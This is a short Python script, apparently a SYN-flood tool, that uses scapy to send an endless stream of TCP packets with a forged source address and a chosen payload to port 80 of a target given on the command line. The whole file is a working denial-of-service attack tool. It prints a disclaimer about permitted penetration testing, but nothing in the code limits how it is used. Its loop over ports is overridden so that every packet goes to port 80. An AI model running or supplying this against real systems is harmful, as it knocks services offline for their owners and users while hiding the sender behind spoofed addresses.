#!/usr/bin/python

from scapy.all import *
from termcolor import cprint
import sys

def synFlood(src, tgt, message):
    for dport in range(1024, 65535):
        dport = 80
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=4444, dport=dport)
        #RAWlayer = Raw(b"X"*2048)
        RAWlayer = Raw(load=message) 
        pkt = IPlayer/TCPlayer/RAWlayer
        send(pkt)

source = sys.argv[1]
target = sys.argv[2]
message = sys.argv[3]

cprint("!! REMEMBER! Do not use this for illegal activities, this is meant only for pen testing with PERMISSION !!", "lightblue")
cprint("[*] SynFlooding activated", "green")
while True:
    synFlood(source, target, message)

